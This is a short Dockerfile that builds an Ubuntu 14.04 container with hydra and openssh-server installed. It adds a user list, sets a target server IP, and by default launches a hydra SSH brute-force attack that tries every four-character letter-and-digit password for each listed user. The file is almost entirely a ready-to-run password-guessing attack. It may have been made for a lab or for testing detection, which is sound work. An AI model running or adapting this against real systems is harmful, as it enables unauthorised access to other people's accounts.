FROM ubuntu:14.04

MAINTAINER marcos cano marcos.cano@galileo.edu

RUN apt-get update
RUN apt-get -y install hydra openssh-server


ADD docker/user_list /
ENV server 192.168.8.66

#CMD echo $(date) > /var/log/lastlog && tail -f /var/log/lastlog
CMD hydra -L /user_list -V -x 4:4:aA1 $server ssh